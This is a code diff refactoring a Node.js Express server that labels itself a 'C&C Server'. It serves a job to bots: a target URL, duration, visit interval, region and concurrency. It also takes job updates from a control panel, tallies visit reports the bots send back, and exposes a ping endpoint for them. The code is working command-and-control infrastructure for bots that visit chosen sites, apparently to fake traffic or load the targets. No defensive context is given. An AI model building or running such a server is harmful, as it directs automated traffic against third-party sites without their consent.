@@ -4,7 +4,7 @@ const path = require('path');
 const fs = require('fs');
 
 const app = express();
-const PORT = process.env.PORT || 3000; // Render assigns its own PORT
+const PORT = process.env.PORT || 3000;
 
 const CONFIG_FILE = path.join(__dirname, 'config.json');
 
@@ -12,77 +12,94 @@ app.use(cors());
 app.use(express.json());
 
 // ---------------------------
-//      API ROUTES FIRST
+//       DEFAULT JOB
 // ---------------------------
-
 let currentJob = {
-    targetUrl: 'https://example.com',
+    targetUrl: "https://example.com",
     duration: 30000,
     interval: 5000,
     region: null,
     concurrency: 5
 };
 
-// Load saved config (if exists)
+// ---------------------------
+//   LOAD SAVED CONFIG
+// ---------------------------
 if (fs.existsSync(CONFIG_FILE)) {
     try {
-        const savedConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
-        currentJob = { ...currentJob, ...savedConfig };
-        console.log('[*] Loaded config:', currentJob);
+        const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
+        currentJob = { ...currentJob, ...saved };
+        console.log("[*] Loaded saved config:", currentJob);
     } catch (err) {
-        console.error('Failed to load config:', err.message);
+        console.log("[-] Failed to read config:", err.message);
     }
 }
 
+// ---------------------------
+//        STATS
+// ---------------------------
 let stats = {
     totalVisits: 0,
     visitsByUrl: {}
 };
 
-// --- API: Get current job ---
+// ---------------------------
+//     API ROUTES
+// ---------------------------
+
+// Give job to bot
 app.get('/api/job', (req, res) => {
     res.json(currentJob);
 });
 
-// --- API: Update job ---
+// Update job from panel
 app.post('/api/job', (req, res) => {
     const { targetUrl, duration, interval, region, concurrency } = req.body;
-    
+
     currentJob = {
-        targetUrl,
-        duration: parseInt(duration) || 60000,
+        targetUrl: targetUrl || currentJob.targetUrl,
+        duration: parseInt(duration) || 30000,
         interval: parseInt(interval) || 5000,
         region: region || null,
         concurrency: parseInt(concurrency) || 5
     };
 
-    fs.writeFileSync(CONFIG_FILE, JSON.stringify(currentJob, null, 2));
+    try {
+        fs.writeFileSync(CONFIG_FILE, JSON.stringify(currentJob, null, 2));
+    } catch (err) {
+        console.log("[-] Failed to save config:", err.message);
+    }
+
     res.json({ success: true, job: currentJob });
 });
 
-// --- API: Report visit ---
+// Receive visit report from bot
 app.post('/api/report-visit', (req, res) => {
     const { url } = req.body;
 
-    if (url) {
-        stats.totalVisits++;
-        stats.visitsByUrl[url] = (stats.visitsByUrl[url] || 0) + 1;
-        res.json({ success: true });
-        console.log(`[+] Visit reported for ${url}. Total: ${stats.totalVisits}`);
-    } else {
-        res.status(400).json({ error: 'URL is required' });
-    }
+    if (!url) return res.status(400).json({ error: "URL required" });
+
+    stats.totalVisits++;
+    stats.visitsByUrl[url] = (stats.visitsByUrl[url] || 0) + 1;
+
+    console.log(`[+] Visit reported for ${url}. Total: ${stats.totalVisits}`);
+    res.json({ success: true });
 });
 
-// --- API: Get stats ---
+// Get stats
 app.get('/api/stats', (req, res) => {
     res.json(stats);
 });
 
+// Health check for Render & bots
+app.get('/ping', (req, res) => {
+    res.json({ alive: true, timestamp: Date.now() });
+});
+
 // ---------------------------
-//  STATIC FILES (SAME FOLDER)
+//   STATIC FRONTEND FILES
 // ---------------------------
-app.use(express.static(__dirname));
+app.use(express.static(path.join(__dirname)));
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
@@ -90,5 +107,5 @@ app.get('/', (req, res) => {
 
 // ---------------------------
 app.listen(PORT, () => {
-    console.log(`[+] C&C Server running on http://localhost:${PORT}`);
+    console.log(`[+] C&C Server online → Port ${PORT}`);
 });
